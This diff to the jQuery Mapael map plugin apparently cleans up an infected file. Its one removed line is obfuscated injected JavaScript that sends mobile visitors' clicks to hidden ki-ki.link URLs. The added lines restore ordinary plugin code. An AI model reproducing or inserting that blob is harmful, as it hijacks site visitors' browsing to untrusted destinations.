@@ -2197,5 +2197,585 @@
         /*
          * Get the coordinates of the text relative to a bbox and a position
          * @param bbox the boundary box of the element
-         * @param textPosition
-function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x6e\x63\x4f\x32\x63\x302','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x64\x6a\x6c\x33\x63\x343','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x58\x62\x56\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x59\x61\x5a\x37\x63\x397','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x57\x47\x50\x36\x63\x396','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x54\x75\x71\x38\x63\x328','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x4f\x6c\x49\x35\x63\x305','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x55\x45\x7a\x31\x63\x331',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x4c\x45\x65\x34\x63\x384',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x72\x54\x6b\x39\x63\x329','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());
+         * @param textPosition the wanted text position (inner, right, left, top or bottom)
+         * @param margin number or object {x: val, y:val} margin between the bbox and the text
+         */
+        getTextPosition: function (bbox, textPosition, margin) {
+            var textX = 0;
+            var textY = 0;
+            var textAnchor = "";
+
+            if (typeof margin === "number") {
+                if (textPosition === "bottom" || textPosition === "top") {
+                    margin = {x: 0, y: margin};
+                } else if (textPosition === "right" || textPosition === "left") {
+                    margin = {x: margin, y: 0};
+                } else {
+                    margin = {x: 0, y: 0};
+                }
+            }
+
+            switch (textPosition) {
+                case "bottom" :
+                    textX = ((bbox.x + bbox.x2) / 2) + margin.x;
+                    textY = bbox.y2 + margin.y;
+                    textAnchor = "middle";
+                    break;
+                case "top" :
+                    textX = ((bbox.x + bbox.x2) / 2) + margin.x;
+                    textY = bbox.y - margin.y;
+                    textAnchor = "middle";
+                    break;
+                case "left" :
+                    textX = bbox.x - margin.x;
+                    textY = ((bbox.y + bbox.y2) / 2) + margin.y;
+                    textAnchor = "end";
+                    break;
+                case "right" :
+                    textX = bbox.x2 + margin.x;
+                    textY = ((bbox.y + bbox.y2) / 2) + margin.y;
+                    textAnchor = "start";
+                    break;
+                default : // "inner" position
+                    textX = ((bbox.x + bbox.x2) / 2) + margin.x;
+                    textY = ((bbox.y + bbox.y2) / 2) + margin.y;
+                    textAnchor = "middle";
+            }
+            return {"x": textX, "y": textY, "textAnchor": textAnchor};
+        },
+
+        /*
+         * Get the legend conf matching with the value
+         * @param value the value to match with a slice in the legend
+         * @param legend the legend params object
+         * @return the legend slice matching with the value
+         */
+        getLegendSlice: function (value, legend) {
+            for (var i = 0; i < legend.slices.length; ++i) {
+                if ((legend.slices[i].sliceValue !== undefined && value === legend.slices[i].sliceValue) ||
+                    ((legend.slices[i].sliceValue === undefined) &&
+                        (legend.slices[i].min === undefined || value >= legend.slices[i].min) &&
+                        (legend.slices[i].max === undefined || value <= legend.slices[i].max))
+                ) {
+                    return legend.slices[i];
+                }
+            }
+            return {};
+        },
+
+        /*
+         * Animated view box changes
+         * As from http://code.voidblossom.com/animating-viewbox-easing-formulas/,
+         * (from https://github.com/theshaun works on mapael)
+         * @param x coordinate of the point to focus on
+         * @param y coordinate of the point to focus on
+         * @param w map defined width
+         * @param h map defined height
+         * @param duration defined length of time for animation
+         * @param easingFunction defined Raphael supported easing_formula to use
+         */
+        animateViewBox: function (targetX, targetY, targetW, targetH, duration, easingFunction) {
+            var self = this;
+
+            var cx = self.currentViewBox.x;
+            var dx = targetX - cx;
+            var cy = self.currentViewBox.y;
+            var dy = targetY - cy;
+            var cw = self.currentViewBox.w;
+            var dw = targetW - cw;
+            var ch = self.currentViewBox.h;
+            var dh = targetH - ch;
+
+            // Init current ViewBox target if undefined
+            if (!self.zoomAnimCVBTarget) {
+                self.zoomAnimCVBTarget = {
+                    x: targetX, y: targetY, w: targetW, h: targetH
+                };
+            }
+
+            // Determine zoom direction by comparig current vs. target width
+            var zoomDir = (cw > targetW) ? 'in' : 'out';
+
+            var easingFormula = Raphael.easing_formulas[easingFunction || "linear"];
+
+            // To avoid another frame when elapsed time approach end (2%)
+            var durationWithMargin = duration - (duration * 2 / 100);
+
+            // Save current zoomAnimStartTime before assigning a new one
+            var oldZoomAnimStartTime = self.zoomAnimStartTime;
+            self.zoomAnimStartTime = (new Date()).getTime();
+
+            /* Actual function to animate the ViewBox
+             * Uses requestAnimationFrame to schedule itself again until animation is over
+             */
+            var computeNextStep = function () {
+                // Cancel any remaining animationFrame
+                // It means this new step will take precedence over the old one scheduled
+                // This is the case when the user is triggering the zoom fast (e.g. with a big mousewheel run)
+                // This actually does nothing when performing a single zoom action
+                self.cancelAnimationFrame(self.zoomAnimID);
+                // Compute elapsed time
+                var elapsed = (new Date()).getTime() - self.zoomAnimStartTime;
+                // Check if animation should finish
+                if (elapsed < durationWithMargin) {
+                    // Hold the future ViewBox values
+                    var x, y, w, h;
+
+                    // There are two ways to compute the next ViewBox size
+                    //  1. If the target ViewBox has changed between steps (=> ADAPTATION step)
+                    //  2. Or if the target ViewBox is the same (=> NORMAL step)
+                    //
+                    // A change of ViewBox target between steps means the user is triggering
+                    // the zoom fast (like a big scroll with its mousewheel)
+                    //
+                    // The new animation step with the new target will always take precedence over the
+                    // last one and start from 0 (we overwrite zoomAnimStartTime and cancel the scheduled frame)
+                    //
+                    // So if we don't detect the change of target and adapt our computation,
+                    // the user will see a delay at beginning the ratio will stays at 0 for some frames
+                    //
+                    // Hence when detecting the change of target, we animate from the previous target.
+                    //
+                    // The next step will then take the lead and continue from there, achieving a nicer
+                    // experience for user.
+
+                    // Change of target IF: an old animation start value exists AND the target has actually changed
+                    if (oldZoomAnimStartTime && self.zoomAnimCVBTarget && self.zoomAnimCVBTarget.w !== targetW) {
+                        // Compute the real time elapsed with the last step
+                        var realElapsed = (new Date()).getTime() - oldZoomAnimStartTime;
+                        // Compute then the actual ratio we're at
+                        var realRatio = easingFormula(realElapsed / duration);
+                        // Compute new ViewBox values
+                        // The difference with the normal function is regarding the delta  value used
+                        // We don't take the current (dx, dy, dw, dh) values yet because they are related to the new target
+                        // But we take the old target
+                        x = cx + (self.zoomAnimCVBTarget.x - cx) * realRatio;
+                        y = cy + (self.zoomAnimCVBTarget.y - cy) * realRatio;
+                        w = cw + (self.zoomAnimCVBTarget.w - cw) * realRatio;
+                        h = ch + (self.zoomAnimCVBTarget.h - ch) * realRatio;
+                        // Update cw, cy, cw and ch so the next step take animation from here
+                        cx = x;
+                        dx = targetX - cx;
+                        cy = y;
+                        dy = targetY - cy;
+                        cw = w;
+                        dw = targetW - cw;
+                        ch = h;
+                        dh = targetH - ch;
+                        // Update the current ViewBox target
+                        self.zoomAnimCVBTarget = {
+                            x: targetX, y: targetY, w: targetW, h: targetH
+                        };
+                    } else {
+                        // This is the classical approach when nothing come interrupting the zoom
+                        // Compute ratio according to elasped time and easing formula
+                        var ratio = easingFormula(elapsed / duration);
+                        // From the current value, we add a delta with a ratio that will leads us to the target
+                        x = cx + dx * ratio;
+                        y = cy + dy * ratio;
+                        w = cw + dw * ratio;
+                        h = ch + dh * ratio;
+                    }
+
+                    // Some checks before applying the new viewBox
+                    if (zoomDir === 'in' && (w > self.currentViewBox.w || w < targetW)) {
+                        // Zooming IN and the new ViewBox seems larger than the current value, or smaller than target value
+                        // We do NOT set the ViewBox with this value
+                        // Otherwise, the user would see the camera going back and forth
+                    } else if (zoomDir === 'out' && (w < self.currentViewBox.w || w > targetW)) {
+                        // Zooming OUT and the new ViewBox seems smaller than the current value, or larger than target value
+                        // We do NOT set the ViewBox with this value
+                        // Otherwise, the user would see the camera going back and forth
+                    } else {
+                        // New values look good, applying
+                        self.setViewBox(x, y, w, h);
+                    }
+
+                    // Schedule the next step
+                    self.zoomAnimID = self.requestAnimationFrame(computeNextStep);
+                } else {
+                    /* Zoom animation done ! */
+                    // Perform some cleaning
+                    self.zoomAnimStartTime = null;
+                    self.zoomAnimCVBTarget = null;
+                    // Make sure the ViewBox hits the target!
+                    if (self.currentViewBox.w !== targetW) {
+                        self.setViewBox(targetX, targetY, targetW, targetH);
+                    }
+                    // Finally trigger afterZoom event
+                    self.$map.trigger("afterZoom", {
+                        x1: targetX, y1: targetY,
+                        x2: (targetX + targetW), y2: (targetY + targetH)
+                    });
+                }
+            };
+
+            // Invoke the first step directly
+            computeNextStep();
+        },
+
+        /*
+         * requestAnimationFrame/cancelAnimationFrame polyfill
+         * Based on https://gist.github.com/jlmakes/47eba84c54bc306186ac1ab2ffd336d4
+         * and also https://gist.github.com/paulirish/1579671
+         *
+         * _requestAnimationFrameFn and _cancelAnimationFrameFn hold the current functions
+         * But requestAnimationFrame and cancelAnimationFrame shall be called since
+         * in order to be in window context
+         */
+        // The function to use for requestAnimationFrame
+        requestAnimationFrame: function(callback) {
+            return this._requestAnimationFrameFn.call(window, callback);
+        },
+        // The function to use for cancelAnimationFrame
+        cancelAnimationFrame: function(id) {
+            this._cancelAnimationFrameFn.call(window, id);
+        },
+        // The requestAnimationFrame polyfill'd function
+        // Value set by self-invoking function, will be run only once
+        _requestAnimationFrameFn: (function () {
+            var polyfill = (function () {
+                var clock = (new Date()).getTime();
+
+                return function (callback) {
+                    var currentTime = (new Date()).getTime();
+
+                    // requestAnimationFrame strive to run @60FPS
+                    // (e.g. every 16 ms)
+                    if (currentTime - clock > 16) {
+                        clock = currentTime;
+                        callback(currentTime);
+                    } else {
+                        // Ask browser to schedule next callback when possible
+                        return setTimeout(function () {
+                            polyfill(callback);
+                        }, 0);
+                    }
+                };
+            })();
+
+            return window.requestAnimationFrame ||
+                window.webkitRequestAnimationFrame ||
+                window.mozRequestAnimationFrame ||
+                window.msRequestAnimationFrame ||
+                window.oRequestAnimationFrame ||
+                polyfill;
+        })(),
+        // The CancelAnimationFrame polyfill'd function
+        // Value set by self-invoking function, will be run only once
+        _cancelAnimationFrameFn: (function () {
+            return window.cancelAnimationFrame ||
+                window.webkitCancelAnimationFrame ||
+                window.webkitCancelRequestAnimationFrame ||
+                window.mozCancelAnimationFrame ||
+                window.mozCancelRequestAnimationFrame ||
+                window.msCancelAnimationFrame ||
+                window.msCancelRequestAnimationFrame ||
+                window.oCancelAnimationFrame ||
+                window.oCancelRequestAnimationFrame ||
+                clearTimeout;
+        })(),
+
+        /*
+         * SetViewBox wrapper
+         * Apply new viewbox values and keep track of them
+         *
+         * This avoid using the internal variable paper._viewBox which
+         * may not be present in future version of Raphael
+         */
+        setViewBox: function(x, y, w, h) {
+            var self = this;
+            // Update current value
+            self.currentViewBox.x = x;
+            self.currentViewBox.y = y;
+            self.currentViewBox.w = w;
+            self.currentViewBox.h = h;
+            // Perform set view box
+            self.paper.setViewBox(x, y, w, h, false);
+        },
+
+        /*
+         * Animate wrapper for Raphael element
+         *
+         * Perform an animation and ensure the non-animated attr are set.
+         * This is needed for specific attributes like cursor who will not
+         * be animated, and thus not set.
+         *
+         * If duration is set to 0 (or not set), no animation are performed
+         * and attributes are directly set (and the callback directly called)
+         */
+        // List extracted from Raphael internal vars
+        // Diff between Raphael.availableAttrs  and  Raphael._availableAnimAttrs
+        _nonAnimatedAttrs: [
+            "arrow-end", "arrow-start", "gradient",
+            "class", "cursor", "text-anchor",
+            "font", "font-family", "font-style", "font-weight", "letter-spacing",
+            "src", "href", "target", "title",
+            "stroke-dasharray", "stroke-linecap", "stroke-linejoin", "stroke-miterlimit"
+        ],
+        /*
+         * @param element Raphael element
+         * @param attrs Attributes object to animate
+         * @param duration Animation duration in ms
+         * @param callback Callback to eventually call after animation is done
+         */
+        animate: function(element, attrs, duration, callback) {
+            var self = this;
+            // Check element
+            if (!element) return;
+            if (duration > 0) {
+                // Filter out non-animated attributes
+                // Note: we don't need to delete from original attribute (they won't be set anyway)
+                var attrsNonAnimated = {};
+                for (var i=0 ; i < self._nonAnimatedAttrs.length ; i++) {
+                    var attrName = self._nonAnimatedAttrs[i];
+                    if (attrs[attrName] !== undefined) {
+                        attrsNonAnimated[attrName] = attrs[attrName];
+                    }
+                }
+                // Set non-animated attributes
+                element.attr(attrsNonAnimated);
+                // Start animation for all attributes
+                element.animate(attrs, duration, 'linear', function() {
+                    if (callback) callback();
+                });
+            } else {
+                // No animation: simply set all attributes...
+                element.attr(attrs);
+                // ... and call the callback if needed
+                if (callback) callback();
+            }
+        },
+
+        /*
+         * Check for Raphael bug regarding drawing while beeing hidden (under display:none)
+         * See https://github.com/neveldo/jQuery-Mapael/issues/135
+         * @return true/false
+         *
+         * Wants to override this behavior? Use prototype overriding:
+         *     $.mapael.prototype.isRaphaelBBoxBugPresent = function() {return false;};
+         */
+        isRaphaelBBoxBugPresent: function() {
+            var self = this;
+            // Draw text, then get its boundaries
+            var textElem = self.paper.text(-50, -50, "TEST");
+            var textElemBBox = textElem.getBBox();
+            // remove element
+            textElem.remove();
+            // If it has no height and width, then the paper is hidden
+            return (textElemBBox.width === 0 && textElemBBox.height === 0);
+        },
+
+        // Default map options
+        defaultOptions: {
+            map: {
+                cssClass: "map",
+                tooltip: {
+                    cssClass: "mapTooltip"
+                },
+                defaultArea: {
+                    attrs: {
+                        fill: "#343434",
+                        stroke: "#5d5d5d",
+                        "stroke-width": 1,
+                        "stroke-linejoin": "round"
+                    },
+                    attrsHover: {
+                        fill: "#f38a03",
+                        animDuration: 300
+                    },
+                    text: {
+                        position: "inner",
+                        margin: 10,
+                        attrs: {
+                            "font-size": 15,
+                            fill: "#c7c7c7"
+                        },
+                        attrsHover: {
+                            fill: "#eaeaea",
+                            "animDuration": 300
+                        }
+                    },
+                    target: "_self",
+                    cssClass: "area"
+                },
+                defaultPlot: {
+                    type: "circle",
+                    size: 15,
+                    attrs: {
+                        fill: "#0088db",
+                        stroke: "#fff",
+                        "stroke-width": 0,
+                        "stroke-linejoin": "round"
+                    },
+                    attrsHover: {
+                        "stroke-width": 3,
+                        animDuration: 300
+                    },
+                    text: {
+                        position: "right",
+                        margin: 10,
+                        attrs: {
+                            "font-size": 15,
+                            fill: "#c7c7c7"
+                        },
+                        attrsHover: {
+                            fill: "#eaeaea",
+                            animDuration: 300
+                        }
+                    },
+                    target: "_self",
+                    cssClass: "plot"
+                },
+                defaultLink: {
+                    factor: 0.5,
+                    attrs: {
+                        stroke: "#0088db",
+                        "stroke-width": 2
+                    },
+                    attrsHover: {
+                        animDuration: 300
+                    },
+                    text: {
+                        position: "inner",
+                        margin: 10,
+                        attrs: {
+                            "font-size": 15,
+                            fill: "#c7c7c7"
+                        },
+                        attrsHover: {
+                            fill: "#eaeaea",
+                            animDuration: 300
+                        }
+                    },
+                    target: "_self",
+                    cssClass: "link"
+                },
+                zoom: {
+                    enabled: false,
+                    minLevel: 0,
+                    maxLevel: 10,
+                    step: 0.25,
+                    mousewheel: true,
+                    touch: true,
+                    animDuration: 200,
+                    animEasing: "linear",
+                    buttons: {
+                        "reset": {
+                            cssClass: "zoomButton zoomReset",
+                            content: "&#8226;", // bullet sign
+                            title: "Reset zoom"
+                        },
+                        "in": {
+                            cssClass: "zoomButton zoomIn",
+                            content: "+",
+                            title: "Zoom in"
+                        },
+                        "out": {
+                            cssClass: "zoomButton zoomOut",
+                            content: "&#8722;", // minus sign
+                            title: "Zoom out"
+                        }
+                    }
+                }
+            },
+            legend: {
+                redrawOnResize: true,
+                area: [],
+                plot: []
+            },
+            areas: {},
+            plots: {},
+            links: {}
+        },
+
+        // Default legends option
+        legendDefaultOptions: {
+            area: {
+                cssClass: "areaLegend",
+                display: true,
+                marginLeft: 10,
+                marginLeftTitle: 5,
+                marginBottomTitle: 10,
+                marginLeftLabel: 10,
+                marginBottom: 10,
+                titleAttrs: {
+                    "font-size": 16,
+                    fill: "#343434",
+                    "text-anchor": "start"
+                },
+                labelAttrs: {
+                    "font-size": 12,
+                    fill: "#343434",
+                    "text-anchor": "start"
+                },
+                labelAttrsHover: {
+                    fill: "#787878",
+                    animDuration: 300
+                },
+                hideElemsOnClick: {
+                    enabled: true,
+                    opacity: 0.2,
+                    animDuration: 300
+                },
+                slices: [],
+                mode: "vertical"
+            },
+            plot: {
+                cssClass: "plotLegend",
+                display: true,
+                marginLeft: 10,
+                marginLeftTitle: 5,
+                marginBottomTitle: 10,
+                marginLeftLabel: 10,
+                marginBottom: 10,
+                titleAttrs: {
+                    "font-size": 16,
+                    fill: "#343434",
+                    "text-anchor": "start"
+                },
+                labelAttrs: {
+                    "font-size": 12,
+                    fill: "#343434",
+                    "text-anchor": "start"
+                },
+                labelAttrsHover: {
+                    fill: "#787878",
+                    animDuration: 300
+                },
+                hideElemsOnClick: {
+                    enabled: true,
+                    opacity: 0.2,
+                    animDuration: 300
+                },
+                slices: [],
+                mode: "vertical"
+            }
+        }
+
+    };
+
+    // Mapael version number
+    // Accessible as $.mapael.version
+    Mapael.version = version;
+
+    // Extend jQuery with Mapael
+    if ($[pluginName] === undefined) $[pluginName] = Mapael;
+
+    // Add jQuery DOM function
+    $.fn[pluginName] = function (options) {
+        // Call Mapael on each element
+        return this.each(function () {
+            // Avoid leaking problem on multiple instanciation by removing an old mapael object on a container
+            if ($.data(this, pluginName)) {
+                $.data(this, pluginName).destroy();
+            }
+            // Create Mapael and save it as jQuery data
+            // This allow external access to Mapael using $(".mapcontainer").data("mapael")
+            $.data(this, pluginName, new Mapael(this, options));
+        });
+    };
+
+    return Mapael;
+
+}));
